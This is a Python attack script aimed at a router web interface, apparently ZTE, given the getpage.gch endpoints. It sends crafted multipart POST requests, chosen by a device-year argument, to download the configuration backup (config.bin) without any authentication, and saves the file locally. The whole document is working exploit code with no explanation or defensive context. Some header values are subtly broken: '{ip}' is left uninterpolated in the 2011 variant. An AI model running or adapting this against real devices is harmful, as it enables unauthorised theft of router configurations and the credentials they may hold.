import requests
import sys
import os
import subprocess

ip = sys.argv[1]
year = sys.argv[2]

def send_post_request_2008_2013():
    # URL and headers as specified
    url = f"http://{ip}/getpage.gch?pid=101"
    headers = {
        "Host": f"{ip}",
        #"Content-Length": "142",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": f"http://{ip}",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryCzgz7e9m108QtFGc",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": f"http://{ip}/getpage.gch?pid=1002&nextpage=manager_log_conf_t.gch",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
    }

    # Body data
    data = "------WebKitFormBoundaryCzgz7e9m108QtFGc\r\nContent-Disposition: form-data; name=\"config\"\r\n\r\n------WebKitFormBoundaryCzgz7e9m108QtFGc--"

    response = requests.post(url, headers=headers, data=data)

    print("POST request to:", url)
    print("Headers:", headers)
    print("Body:", data)

    # Return the response object if needed
    return response

def send_post_request_2011():
    url = f"http://{ip}/getpage.gch?pid=100"
    headers = {
        f"Host": "{ip}",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        f"Origin": "http://{ip}",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8AwJK8g4kN0LC9bl",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        f"Referer": "http://{ip}/getpage.gch?pid=1002&nextpage=manager_dev_config_t.gch",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
    }

    data = "------WebKitFormBoundary8AwJK8g4kN0LC9bl\r\nContent-Disposition: form-data; name=\"config\"\r\n\r\n------WebKitFormBoundary8AwJK8g4kN0LC9bl--"

    response = requests.post(url, headers=headers, data=data, timeout=10)

    # Print response for demonstration purposes
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)
    return response


def send_post_request_2012():
    curl_command = [
        'curl', '-i', '-s', '-k', '-X', 'POST',
        '-H', f'Host: {ip}',
        '-H', 'Cache-Control: max-age=0',
        '-H', 'Upgrade-Insecure-Requests: 1',
        '-H', f'Origin: http://{ip}',
        '-H', 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVxFTdBPmTPIJy4fh',
        '-H', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36',
        '-H', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        '-H', f'Referer: http://{ip}/getpage.gch?pid=1002&nextpage=manager_dev_config_t.gch',
        '-H', 'Accept-Encoding: gzip, deflate',
        '-H', 'Accept-Language: en-US,en;q=0.9',
        '-H', 'Connection: close',
        '--data-binary', '------WebKitFormBoundaryVxFTdBPmTPIJy4fh\r\nContent-Disposition: form-data; name="config"\r\n\r\n------WebKitFormBoundaryVxFTdBPmTPIJy4fh--\r\n',
        f'http://{ip}/getpage.gch?pid=100',
        '-oconfig.bin'
    ]

    result = subprocess.run(curl_command)

if year == "2008-2013":
    response = send_post_request_2008_2013()
elif year == "2011":
    response = send_post_request_2011()

if year == "2008-2013" or year == "2011":
    print(response.status_code)
    print(response.content)
    if response.status_code == 200:
            # Write the content of the response to a file
        with open('config.bin', 'wb') as file:
            file.write(response.content)
        print("File downloaded successfully.")
    else:
        print("Failed to download the file. Status code:", response.status_code)

if year == "2012":
    send_post_request_2012()
    # no need to decrypt it
